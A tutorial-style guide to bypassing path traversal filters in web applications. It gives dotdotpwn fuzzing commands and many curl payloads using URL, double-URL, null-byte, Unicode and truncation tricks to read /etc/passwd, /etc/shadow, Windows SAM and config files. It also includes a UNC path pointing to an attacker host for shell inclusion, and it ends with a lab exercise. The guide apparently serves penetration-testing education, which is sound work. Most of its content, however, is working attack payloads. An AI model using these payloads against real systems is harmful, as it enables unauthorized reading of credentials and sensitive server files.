# Path Traversal Bypass Guide

> Systematic techniques for bypassing path traversal filters in file inclusion vulnerabilities. Covers dotdotpwn automated fuzzing, encoding-based bypass (URL, double URL, null byte, Unicode), Windows versus Linux path differences, and defense filter evasion strategies.

## Introduction and Objectives

Path traversal (also known as directory traversal) is a web security vulnerability that allows an attacker to read arbitrary files on the server by manipulating file path parameters. While the basic concept is simple (using `../` sequences to navigate up the directory tree), real-world applications implement various filtering and sanitization mechanisms that require creative bypass techniques.

This guide provides a systematic methodology for bypassing path traversal filters, from understanding filter implementations to applying encoding-based evasion and automated fuzzing with dotdotpwn.

**Learning objectives**:

- Understand how common path traversal filters work and why they fail
- Master encoding-based bypass techniques (URL, double URL, null byte, Unicode)
- Apply platform-specific knowledge (Windows vs Linux path differences)
- Use dotdotpwn for automated traversal fuzzing
- Build a repeatable testing methodology for path traversal assessment

**Prerequisites**: A web application with a file inclusion or file read parameter. Basic understanding of URL encoding, character sets, and web server architecture.

## 1. Understanding Path Traversal Filtering

Applications typically defend against path traversal by filtering `../` sequences in user input. Understanding how filters process input reveals bypass opportunities:

- **String replacement filters** remove `../` once, leaving `....//` which becomes `../` after removal.
- **Regex filters** match specific patterns like `..%2f` but miss alternative encodings.
- **Prefix/suffix appending** adds a base directory or file extension to the input.
- **Character blocklists** deny specific characters like `.` or `/` individually.

Identify which filtering strategy is in use by testing progressively:

```bash
# Test 1: Does basic traversal work?
curl "http://target/page=../../../etc/passwd"

# Test 2: Does absolute path work?
curl "http://target/page=/etc/passwd"

# Test 3: Is ../ being stripped? (....// → ../ after stripping)
curl "http://target/page=....//....//....//etc/passwd"

# Test 4: Is a suffix appended? (null byte test)
curl "http://target/page=../../../etc/passwd%00"
```

## 2. dotdotpwn Automated Fuzzing

dotdotpwn systematically tests hundreds of traversal variations across protocols:

```bash
# HTTP GET fuzzing with Linux target files
dotdotpwn.pl -m http -h target.com -u "/page=TRAVERSAL" -o unix

# HTTP GET fuzzing with Windows target files
dotdotpwn.pl -m http -h target.com -u "/page=TRAVERSAL" -o windows

# Target a specific file (e.g., /etc/shadow)
dotdotpwn.pl -m http -h target.com -u "/page=TRAVERSAL" -f /etc/shadow -o unix

# HTTP POST mode for form parameters
dotdotpwn.pl -m http -h target.com -x POST -d "page=TRAVERSAL" -o unix

# Specify traversal depth (default is 6)
dotdotpwn.pl -m http -h target.com -u "/page=TRAVERSAL" -d 10 -o unix

# Match specific string in response to confirm success
dotdotpwn.pl -m http -h target.com -u "/page=TRAVERSAL" -o unix -k "root:x:"

# FTP protocol fuzzing
dotdotpwn.pl -m ftp -h target.com -u "USERNAME" -p "TRAVERSAL"

# Output results to file
dotdotpwn.pl -m http -h target.com -u "/page=TRAVERSAL" -o unix > traversal_results.txt
```

dotdotpwn tests each encoding variant at multiple traversal depths, finding bypasses that manual testing misses.

## 3. Encoding-Based Bypass Techniques

### URL Encoding

Single URL encoding replaces characters with their percent-encoded equivalents:

```bash
# Encode . and /
curl "http://target/page=%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl "http://target/page=..%2f..%2f..%2fetc/passwd"
curl "http://target/page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
```

This bypasses filters that look for the literal string `../` but do not URL-decode before checking.

### Double URL Encoding

Double encoding applies URL encoding twice. The server decodes once, producing a single-encoded string, which the application then decodes again to produce the original traversal:

```bash
# . → %2e → %252e
# / → %2f → %252f
curl "http://target/page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd"
curl "http://target/page=..%252f..%252f..%252fetc/passwd"
```

This works when the WAF or input filter URL-decodes once, but the backend application decodes a second time (common with mod_rewrite and reverse proxy setups).

### Null Byte Injection (PHP < 5.3.4)

Null bytes (`%00`) terminate C strings. In PHP versions before 5.3.4, including a null byte in a file path causes PHP to ignore everything after it:

```bash
# Bypass suffix appending (e.g., .php is added automatically)
curl "http://target/page=../../../etc/passwd%00"
curl "http://target/page=../../../etc/passwd%00.jpg"
curl "http://target/page=../../../etc/passwd%00.html"
```

Check the PHP version before investing time in null byte testing. This technique is ineffective on PHP 5.3.4+.

### Unicode Encoding

Web servers may normalize Unicode-encoded path separators differently than WAFs expect:

```bash
# Overlong UTF-8 encoding of /
# / = 0x2F, overlong = 0xC0 0xAF
curl "http://target/page=..%c0%af..%c0%af..%c0%afetc/passwd"

# Fullwidth solidus (Unicode U+FF0F)
curl "http://target/page=..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd"

# Fullwidth full stop (Unicode U+FF0E)
curl "http://target/page=%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8f%ef%bc%8e%ef%bc%8e%ef%bc%8fetc/passwd"
```

Unicode normalization attacks work when the server normalizes Unicode characters before file operations but the WAF checks the raw input.

### Path Truncation (PHP < 5.3)

On PHP versions before 5.3, file paths are limited to 4096 characters on Linux. If a suffix is appended, padding the path to exactly 4096 characters truncates the suffix:

```bash
# Generate a truncated path
python3 -c "
traversal = '../' * 300
target = 'etc/passwd'
# Pad with characters to reach ~4096 bytes
padding = './' * ((4092 - len(traversal + target)) // 2)
print(traversal + padding + target)
"
```

## 4. Windows vs Linux Path Differences

Path traversal behaves differently on Windows and Linux:

**Linux targets:**

```bash
# Standard traversal
../../../etc/passwd
../../../etc/shadow
../../../home/user/.bash_history
../../../var/www/html/config.php
../../../proc/self/environ

# Use / as path separator
# Case-sensitive filesystem
```

**Windows targets:**

```bash
# Both / and \ work as path separators on Windows
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\windows\win.ini
..\..\..\windows\repair\sam
..\..\..\inetpub\wwwroot\web.config

# Mixed separators often work
..%2f..%5c..%5cwindows%2fwin.ini

# Windows is case-insensitive
..\..\..\WINDOWS\WIN.INI
..\..\..\Windows\System32\drivers\etc\HOSTS

# UNC paths for SMB inclusion
\\attacker_ip\share\shell.php

# Windows-specific sensitive files
C:\Windows\panther\unattend.xml
C:\Windows\System32\config\SAM
C:\Windows\repair\SAM
C:\Windows\System32\inetsrv\config\applicationHost.config
```

**IIS-specific traversal:**

```bash
# IIS double decoding (similar to double URL encoding)
..%255c..%255c..%255cwindows%255cwin.ini

# IIS UTF-8 bypass
..%c0%af..%c0%af..%c0%afwindows%c0%afwin.ini
```

## 5. Defense Filter Evasion Strategies

When facing sophisticated WAF or application-level filtering, combine multiple techniques:

```bash
# Combine encoding with filter stripping bypass
# If server strips ../ once and then URL-decodes:
curl "http://target/page=..%2f..%2f....//....//etc/passwd"

# Use path normalization quirks
# Some servers resolve /./ to / and //. to /
curl "http://target/page=/var/www/html/./../../etc/./passwd"
curl "http://target/page=//....//....//etc/passwd"

# Mix forward and backward slashes (works on both platforms)
curl "http://target/page=..%2f..%5c..%2fetc/passwd"

# Use semicolon bypass (some frameworks treat ; as query separator)
curl "http://target/page=../../../etc/passwd;.jpg"

# Use double dot with alternative encodings
curl "http://target/page=..%252f..%252f..%252fetc/passwd"
```

## 6. Testing Methodology

Follow this systematic approach when testing path traversal:

1. **Identify input vectors** -- parameters that accept file paths or names
2. **Test basic traversal** -- `../../../etc/passwd` and `/etc/passwd`
3. **Test filter stripping** -- `....//....//etc/passwd`
4. **Test URL encoding** -- `..%2f..%2f..%2fetc/passwd`
5. **Test double encoding** -- `..%252f..%252f..%252fetc/passwd`
6. **Test null byte** -- `../../../etc/passwd%00`
7. **Test Unicode** -- `..%c0%af..%c0%afetc/passwd`
8. **Test path truncation** -- long paths with padding
9. **Run dotdotpwn** -- automated comprehensive fuzzing
10. **Test Windows paths** -- if target is IIS or Windows-based

## Hands-on Exercise: Path Traversal Bypass

Practice path traversal bypass techniques against a deliberately vulnerable application:

**Setup**:

```bash
# Deploy a vulnerable application with path traversal filters
docker run -d -p 80:80 puzzles/pathtraversal-lab
```

**Exercise steps**:

1. Identify all parameters that accept file names or paths using parameter fuzzing
2. Test basic traversal (`../../../etc/passwd`) and absolute paths (`/etc/passwd`)
3. If filtered, test `....//` to exploit single-pass string replacement filters
4. Apply URL encoding (`%2e%2e%2f`) and double URL encoding (`%252e%252e%252f`)
5. Test null byte injection if PHP version is below 5.3.4
6. Run dotdotpwn with `-k "root:x:"` to automate the full bypass search
7. Document which bypass technique succeeded and analyze why the filter failed

**Validation criteria**: Successfully read `/etc/passwd` using at least three different bypass techniques. Identify the specific filter implementation based on which techniques succeed and fail.

## References and Resources

- [PortSwigger - Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [dotdotpwn GitHub](https://github.com/wireghoul/dotdotpwn)
- [HackTricks - LFI Tricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-and-rfi-using-wrappers)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [SecLists LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
- [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
